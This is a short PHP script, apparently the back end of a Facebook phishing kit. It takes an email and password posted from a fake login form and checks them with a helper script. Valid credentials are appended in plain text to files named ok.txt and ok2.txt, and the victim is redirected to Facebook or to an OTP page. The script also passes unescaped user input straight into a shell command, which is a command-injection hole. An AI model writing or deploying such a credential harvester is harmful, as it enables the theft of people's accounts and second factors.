<?php
$e = $_POST['email'];
$p = $_POST['pass'];
$command = 'python check.py ' . $e . ' ' . $p;
// $command = 'python check.py ' . $_POST['email'] . ' ' . $_POST['pass'];
passthru($command);
if (file_exists('correct.txt')){
	$filed = fopen("ok.txt", "a");
	fwrite($filed, $e);
	fwrite($filed, ':');
	fwrite($filed, $p);
	fclose($filed);
	unlink('correct.txt');
	header('Location: https://m.facebook.com');
} elseif (file_exists('otp.txt')){
	$filed = fopen("ok2.txt", "a");
        fwrite($filed, $e);
        fwrite($filed, ':');
        fwrite($filed, $p);
        fclose($filed);
	header('Location: otp.login.php');
	unlink('otp.txt');
} elseif (file_exists('tl.txt')){
	header('Location: login.html');
	unlink('tl.txt');
} elseif (file_exists('incorrect.txt')){
	header('Location: login.html');
	unlink('incorrect.txt');
} else {
	header('Location: login.html');
}



exit();
?>
